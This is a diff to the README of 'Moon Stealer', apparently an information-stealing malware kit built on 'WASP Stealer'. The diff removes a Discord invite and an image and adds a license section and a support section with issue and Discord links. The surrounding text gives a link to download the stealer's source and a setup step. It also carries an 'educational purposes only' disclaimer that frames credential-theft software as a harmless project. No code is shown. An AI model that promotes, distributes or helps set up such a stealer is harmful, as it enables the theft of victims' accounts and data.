@@ -5,8 +5,6 @@
  
 ### Based on WASP Stealer.
 
-### [MOON Discord Server](https://discord.gg/fnNd26Depz)
-
 ### Setup
 
 1. [Download source code zip](https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip)
@@ -69,9 +67,12 @@
  
 I am not responsible for any damage this software may cause; This program was made for educational purposes only.
 
+## License
+
+Moon Stealer is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+
+## Errors?
+- Make an [issue](https://github.com/Yuvi5001/moon-stealer/issues)
+- Join the [Discord](https://discord.gg/fnNd26Depz)
+
 Credits: WASP Stealer
-
-<h1 align="center">
-<img src="https://media.discordapp.net/attachments/1069188941867143168/1069387851743105166/My_project-1_7.png?width=1065&height=533" width="989"></img>
-
-<h1 align="center">
